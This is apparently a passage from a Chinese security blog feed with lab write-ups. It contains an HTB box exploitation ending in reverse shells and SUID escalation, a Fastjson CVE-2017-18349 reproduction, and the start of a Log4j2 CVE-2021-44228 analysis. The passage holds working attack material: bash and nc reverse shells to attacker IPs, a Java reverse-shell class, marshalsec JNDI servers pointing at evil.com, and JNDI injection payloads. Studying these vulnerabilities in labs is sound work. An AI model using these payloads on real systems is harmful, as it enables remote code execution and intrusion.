-m http.server 80</span><br><span class="line">或</span><br><span class="line">php -S 0.0.0.0:80</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240428194211757.png" alt="image-20240428194211757"></p><p>替换Cookie，访问&#x2F;dashboard</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240428194443295.png" alt="image-20240428194443295"></p><h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><p>发包测试</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240428194559570.png" alt="image-20240428194559570"></p><p>反弹shell大部分命令失败</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -c 10.10.16.21 2222 bash# 测试可行</span><br></pre></td></tr></table></figure><p>curl也可以</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240428200746994.png" alt="image-20240428200746994"></p><p>本地起一个http服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">/bin/bash -c &#x27;exec bash -i &gt;&amp; /dev/tcp/10.10.16.21/2222 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240428200626017.png" alt="image-20240428200626017"></p><p>同时监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 2222</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240428200917085.png" alt="image-20240428200917085"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240428210450256.png" alt="image-20240428210450256"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">if [ &quot;$EUID&quot; -ne 0 ]; then</span><br><span class="line">  exit 1</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查当前脚本是否以root用户(UID=0)身份运行，如果当前用户不是root用户，脚本将退出并返回错误码1</span></span><br><span class="line"></span><br><span class="line">last_modified_time=$(/usr/bin/find /boot -name &#x27;vmlinuz*&#x27; -exec stat -c %Y &#123;&#125; + | /usr/bin/sort -n | /usr/bin/tail -n 1)</span><br><span class="line">formatted_time=$(/usr/bin/date -d &quot;@$last_modified_time&quot; +&quot;%d/%m/%Y %H:%M&quot;)</span><br><span class="line">/usr/bin/echo &quot;Last Kernel Modification Time: $formatted_time&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找位于 /boot 目录下，文件名以 <span class="string">&#x27;vmlinuz&#x27;</span> 开头的所有内核映像文件中最新修改的那个文件，格式化日期和时间并输出</span></span><br><span class="line"></span><br><span class="line">disk_space=$(/usr/bin/df -h / | /usr/bin/awk &#x27;NR==2 &#123;print $4&#125;&#x27;)</span><br><span class="line">/usr/bin/echo &quot;Available disk space: $disk_space&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取根目录磁盘分区的可用磁盘空间，格式化输出</span></span><br><span class="line"></span><br><span class="line">load_average=$(/usr/bin/uptime | /usr/bin/awk -F&#x27;load average:&#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">/usr/bin/echo &quot;System load average: $load_average&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取并打印系统的负载平均值</span></span><br><span class="line"></span><br><span class="line">if ! /usr/bin/pgrep -x &quot;initdb.sh&quot; &amp;&gt;/dev/null; then</span><br><span class="line">  /usr/bin/echo &quot;Database service is not running. Starting it...&quot;</span><br><span class="line">  ./initdb.sh 2&gt;/dev/null</span><br><span class="line">else</span><br><span class="line">  /usr/bin/echo &quot;Database service is running.&quot;</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查一个名为 <span class="string">&quot;initdb.sh&quot;</span> 的脚本是否正在运行，如果该脚本没有运行，脚本将启动它；如果已经在运行，则会通知用户数据库服务已经在运行</span></span><br><span class="line"></span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure><blockquote><p><code>bash -p</code> 利用 Bash shell 的一个特性，即在启动时执行一个用户定义的函数，通过在这个函数中包含提权命令，攻击者可以在执行 bash -p 时以 root 权限执行命令</p></blockquote><p>其他的SUID提权亦可</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240428210350088.png" alt="image-20240428210350088"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson 远程命令执行漏洞(CVE-2017-18349)</title>
      <link href="/2024/04/12/vuln/2017%20Fastjson%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/04/12/vuln/2017%20Fastjson%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="Fastjson-远程命令执行漏洞-CVE-2017-18349"><a href="#Fastjson-远程命令执行漏洞-CVE-2017-18349" class="headerlink" title="Fastjson 远程命令执行漏洞(CVE-2017-18349)"></a>Fastjson 远程命令执行漏洞(CVE-2017-18349)</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p><p>参考链接：</p><h4 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h4><p>对于Fastjson来讲，并不是所有的Java对象都能被转为JSON，只有Java Bean格式的对象才能Fastjson被转为JSON。</p><p>Fastjson提供了两个主要接口来分别实现对于Java Object的序列化和反序列化操作：</p><ul><li><code>JSON.toJSONString</code></li><li><code>JSON.parseObject/JSON.parse</code></li></ul><p>反序列化时不指定特定的类，那么Fastjson就默认将一个JSON字符串反序列化为一个JSONObject。需要注意的是，对于类中<code>private</code>类型的属性值，Fastjson默认不会将其序列化和反序列化。</p><h4 id="Fastjson中的-type"><a href="#Fastjson中的-type" class="headerlink" title="Fastjson中的@type"></a>Fastjson中的@type</h4><p>使用Fastjson序列化对象的时候，如果<code>toJSONString()</code>方法不添加额外的属性，那么就会将一个Java Bean转换成JSON字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;age&quot;:18,&quot;name&quot;:&quot;Faster&quot;&#125;</span><br></pre></td></tr></table></figure><p>如果想把JSON字符串反序列化成Java Object，可以使用<code>parse()</code>方法。该方法默认将JSON字符串反序列化为一个JSONObject对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">com.alibaba.fastjson.JSONObject</span><br><span class="line">&#123;&quot;name&quot;:&quot;Faster&quot;,&quot;age&quot;:18&#125;</span><br></pre></td></tr></table></figure><h4 id="将JSON字符串反序列化为原始的类（两种）"><a href="#将JSON字符串反序列化为原始的类（两种）" class="headerlink" title="将JSON字符串反序列化为原始的类（两种）"></a>将JSON字符串反序列化为原始的类（两种）</h4><ol><li>序列化的时候，在<code>toJSONString()</code>方法中添加额外的属性<code>SerializerFeature.WriteClassName</code>，将对象类型一并序列化：</li></ol><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Faster&quot;</span>,<span class="number">18</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//序列化时添加额外属性</span></span><br><span class="line"><span class="type">String</span> <span class="variable">jsonType</span> <span class="operator">=</span> JSON.toJSONString(person, SerializerFeature.WriteClassName);</span><br><span class="line">System.out.println(type);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出，Fastjson在JSON字符串中添加了一个<span class="meta">@type</span>字段，用于标识对象所属的类</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;fastjson.Person&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">18</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Faster&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>在反序列化该JSON字符串的时候，<code>parse()</code>方法就会根据<code>@type</code>标识将其转为原来的类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonText</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Person\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;Faster\&quot;&#125;&quot;</span>;</span><br><span class="line">System.out.println(JSON.parse(jsonText));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//结果如下</span></span><br><span class="line">Person@4459eb14</span><br></pre></td></tr></table></figure><ol start="2"><li>反序列化的时候，在<code>parseObject()</code>方法中手动指定对象的类型</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bject</span> <span class="variable">o3</span> <span class="operator">=</span> JSON.parseObject(jsonText,Person.class);</span><br><span class="line">System.out.println(o3.getClass().getName());</span><br><span class="line">System.out.println(o3);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line">fastjson.Person</span><br><span class="line">fastjson.Person@1e6d1014</span><br></pre></td></tr></table></figure><h4 id="Fastjson分析"><a href="#Fastjson分析" class="headerlink" title="Fastjson分析"></a>Fastjson分析</h4><p>序列化：<code>toJSONString()</code>方法实际是通过调用getter来获取对象的属性值的，根据这些属性值来生成JSON字符串。</p><p>反序列化：<code>parse()</code>先调用@type标识的类的构造函数，然后再调用setter给对象赋值；parseObject()方法会同时调用setter和getter。</p><p><strong>源码分析</strong></p><p><code>DefaultJSONParser#parseObject</code>方法中，通过<code>scanSymbol()</code>方法来解析出表示符 @type</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240201172029725.png" alt="image-20240201172029725"></p><p>反射加载<code>@type</code></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240201195551574.png" alt="image-20240201195551574"></p><p>反射加载的类的时候会对类进行黑名单检查，黑名单中有Thread类</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240201200115379.png" alt="image-20240201200115379"></p><p>然后会在反射获取的方法中循环遍历寻找特定的setter和getter。条件如下：</p><ul><li>方法名长度大于4且以set开头，且第四个字母要是大写</li><li>非静态方法</li><li>返回类型为void或当前类</li><li>参数个数为1个</li></ul><h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>fastjson依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在反序列化时，parse触发了set方法，parseObject同时触发了set和get方法，由于存在这种<code>autoType</code>特性。如果<code>@type</code>标识的类中的setter或getter方法存在恶意代码，那么就有可能存在fastjson反序列化漏洞。</p><h4 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h4><p>Calc.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String calc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calc</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCalc</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getter&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> calc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCalc</span><span class="params">(String calc)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.calc = calc;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setter&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>fastjsonTestCalc.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjsonTestCalc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonCalc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Calc\&quot;,\&quot;calc\&quot;:\&quot;Faster\&quot;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(JSON.parseObject(jsonCalc));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240201202542836.png" alt="image-20240201202542836"></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>CVE-2017-18349</p><p>环境：vulhub</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240324201602077.png" alt="image-20240324201602077"></p><p>目标环境是Java 8u102，没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以使用<code>com.sun.rowset.JdbcRowSetImpl</code>的利用链，借助JNDI注入来执行命令</p><p>ReverseShell.java编译成class并开启http服务(python -m http.server 80)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReverseShell</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.6.110/6666 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240325133120899.png" alt="image-20240325133120899"></p><p>借助<a href="https://github.com/mbechler/marshalsec">marshalsec</a>项目(测试Jdk8u211)，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>ReverseShell.class</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://evil.com/#ReverseShell&quot; 9999</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240325133052275.png" alt="image-20240325133052275"></p><p>向靶场服务器发送Payload，带上RMI的地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-ip:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 160</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://evil.com:9999/ReverseShell&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240325133148708.png" alt="image-20240325133148708"></p><p>Final</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240325133308910.png" alt="image-20240325133308910"></p><p><strong>LDAP</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://evil.com/#ReverseShell&quot; 9999</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240325135737374.png" alt="image-20240325135737374"></p>]]></content>
      
      
      <categories>
          
          <category> Vuln </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Log4j2 lookup JNDI注入(CVE-2021-44228)</title>
      <link href="/2024/04/02/vuln/2021%20Log4j2%20lookup%20JNDI%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/04/02/vuln/2021%20Log4j2%20lookup%20JNDI%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="Log4j2-lookup-JNDI注入-CVE-2021-44228"><a href="#Log4j2-lookup-JNDI注入-CVE-2021-44228" class="headerlink" title="Log4j2 lookup JNDI注入(CVE-2021-44228)"></a>Log4j2 lookup JNDI注入(CVE-2021-44228)</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>Log4j2在处理消息转换时，会按照字符检测每条日志，当日志中包含${}时，则会将表达式的内容替换成真实的内容(即lookup接口查找得到的内容），使用LDAP或RMI协议，能从远程服务区上请求恶意的对象，对象在调用的过程中会被解析执行，导致了Log4j2的漏洞</p><p><strong>影响版本</strong></p><p>Apache Log4j 2.x &lt;&#x3D; 2.14.1</p><p><strong>Log4j2依赖</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>DNSLog</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4j2</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(Log4j2.class);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://$&#123;sys:java.version&#125;.hzitqenuvp.dgrh3.cn&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Java版本信息呈现</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240325172653379.png" alt="image-20240325172653379"></p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>调用堆栈：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">LOGGER.error</span><br><span class="line">……</span><br><span class="line">MessagePatternConverter.format</span><br><span class="line">……</span><br><span class="line">StrSubstitutor.resolveVariable</span><br><span class="line">Interpolator.lookup</span><br><span class="line">JndiLookup.lookup</span><br><span class="line">JndiManager.lookup</span><br><span class="line">InitialContext.lookup</span><br></pre></td></tr></table></figure><p><strong>MessagePatternConverter.format()</strong></p><p>DNSLog代码中的<code>LOGGER.error()</code>方法最终会调用到MessagePatternConverter.format()方法，该方法对日志内容进行解析和格式化，并返回最终格式化后的日志内容。当碰到日志内容中包含${子串时，调用StrSubstitutor进行进一步解析</p><p><strong>StrSubstitutor.resolveVariable()</strong></p><p>StrSubstitutor将${和}之间的内容提取出来，调用并传递给Interpolator.lookup()方法，实现Lookup功能</p><p><strong>Interpolator.lookup()</strong></p><p>Interpolator实际是一个实现Lookup功能的代理类，该类在成员变量strLookupMap中保存着各类Lookup功能的真正实现类。Interpolator对 上一步提取出的内容解析后，从strLookupMap获得Lookup功能实现类，并调用实现类的lookup()方法</p><p><strong>JndiLookup.lookup()</strong></p><p>JndiLookup.lookup()方法调用JndiManager.lookup()方法，获取JNDI对象后，调用该对象上的toString()方法，最终返回该字符串</p><p><strong>JndiManager.lookup()</strong></p><p>直接委托给<code>InitialContext.lookup()</code>方法</p><p>后续便是常规的JNDI注入路径进行分析</p><h3 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI+RMI"></a>JNDI+RMI</h3><p>Log4j2.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4j2</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(Log4j2.class);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:rmi://192.168.6.110:9999/Calc&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Calc.java编译成class文件放在http服务下<code>(python -m http.server 80)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>借助<a href="https://github.com/mbechler/marshalsec">marshalsec</a>项目(测试Jdk8u211)，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>Calc.class</code>：</p><figure class="highlight 